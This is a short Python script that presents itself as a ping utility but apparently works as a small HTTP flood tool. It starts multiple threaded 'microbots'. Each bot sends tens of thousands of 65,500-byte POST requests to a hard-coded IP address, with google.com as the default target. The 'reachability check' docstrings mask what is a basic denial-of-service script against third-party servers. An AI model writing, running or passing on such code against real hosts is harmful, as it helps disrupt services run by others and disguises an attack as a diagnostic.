import requests
import time
import threading

def ping_server(host, count=100000000000, packet_size=65500, bot_id=1):
    """
    Simulates a ping using HTTP requests to check if the server is reachable, with adjustable packet size.
    Args:
        host (str): The server or domain to ping (e.g., "http://google.com").
        count (int): Number of requests to send (default is 100000000000).
        packet_size (int): Size of the packet to simulate (in bytes).
        bot_id (int): The ID for this microbot.
    Returns:
        None
    """
    # Creating a data payload of the specified size
    payload = "a" * packet_size  # 'a' character repeated to create the payload of desired size

    try:
        print(f"Bot-{bot_id}: Pinging {host} with packet size {packet_size} bytes...")

        for i in range(count):
            # Using POST to send a payload (simulate larger packets)
            response = requests.post(host, data=payload)
            if response.status_code == 200:
                print(f"Bot-{bot_id}: {host} is reachable (status code: {response.status_code})")
            else:
                print(f"Bot-{bot_id}: {host} returned an error (status code: {response.status_code})")
            
            time.sleep(1)  # Optional: Adds a delay between pings

        print(f"Bot-{bot_id}: Completed pings to {host}\n")

    except requests.exceptions.RequestException as e:
        print(f"Bot-{bot_id}: An error occurred: {e}")

def start_microbots(num_bots, host="http://google.com", ping_interval=0.1, packet_size= 65500):
    """
    Starts the specified number of microbots, each pinging the server.
    Args:
        num_bots (int): Number of microbots to start.
        host (str): The server or domain to ping.
        ping_interval (float): Interval between each ping request.
        packet_size (int): Size of the packets to simulate (in bytes).
    Returns:
        None
    """
    threads = []
    for i in range(num_bots):
        # Create a new thread for each microbot
        thread = threading.Thread(target=ping_server, args=(host, 99999, packet_size, i + 1))
        threads.append(thread)
        thread.start()
        time.sleep(ping_interval)  # Pause between starting threads (optional)
    
    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    num_bots = 10   # Set the number of microbots to spawn (reduced to 10 for practicality)
    server = "34.120.115.37"  # Set the domain you want to ping (e.g., "google.com")
    ping_interval = 0.1  # Seconds between starting each microbot
    packet_size = 65500  # Adjust the packet size to 1024 bytes (can change this value)

    # Start the microbots with adjustable packet size
    start_microbots(num_bots, server, ping_interval, packet_size)
